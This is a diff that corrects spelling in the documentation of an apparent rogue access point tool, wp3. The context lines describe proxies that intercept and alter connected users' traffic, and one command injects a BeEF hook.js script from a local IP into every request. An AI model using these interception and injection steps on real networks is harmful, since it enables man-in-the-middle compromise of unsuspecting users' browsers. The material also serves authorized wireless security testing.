@@ -299,7 +299,7 @@ start access point (AP), if not something wrong the will be see a new AP with ho
 
 > `stop`
 
-stop access point, process, thread, plugin and proxys that is running in background.
+stop access point, process, thread, plugin and proxies that is running in background.
 
 > `ignore`
 
@@ -375,14 +375,14 @@ wp3 > set plugin_name.subplugins_name true/false
 
 Plugin developers and users are welcome to include your plugin into this project, take a look the guidelines [how to create a plugin](#development).
 
-### Proxys
+### Proxies
 
-The Proxys are designed to add features to WP3 core and run parallel with access point (AP),
+The proxies are designed to add features to WP3 core and run parallel with access point (AP),
 but redirect all traffic with `iptables`. Proxies work by intercepting a request, modifying the request if necessary, then handling or forwarding the request to its destination. When a user connects to a AP, the transparent proxy intercepts the request before passing it on to the provider.  
 
 {% include alert.html type="info" content="The most important is you can run one proxies each time , because the proxies has been designed to work for manipulate data packets redirecting all data for a specific port number" %}
 
-Avaliable Porxys:
+Avaliable proxies:
 
 - **pumpkinproxy** - Proxy for intercept network traffic on TCP protocol [doc](#pumpkinproxy)
 - **captiveflask** - Allow block Internet access for users until they open the page login page. [doc](#captiveflask)
@@ -395,7 +395,7 @@ if you want to select the proxy, follow command bellow.
 wp3 > set proxy proxy_name
 ```
 
-if the proxy has plugins, when type `proxys` you see somes options for set. you can to enable/disable plugin command, type `tab` to autocomplete ;): 
+if the proxy has plugins, when type `proxies` you see somes options for set. you can to enable/disable plugin command, type `tab` to autocomplete ;): 
 ```bash
 wp3 > set proxy_name.plugin_name true/false
 ```
@@ -420,7 +420,7 @@ let now set `url_hook` parameter the plugin beef to inject javascript in all req
 wp3 > set pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js
 ```
 
-Proxys developers and users are welcome to include your proxy into this project, take a look the guidelines [how to create a proxy](#development).
+Proxies developers and users are welcome to include your proxy into this project, take a look the guidelines [how to create a proxy](#development).
 
 ### Modules
 
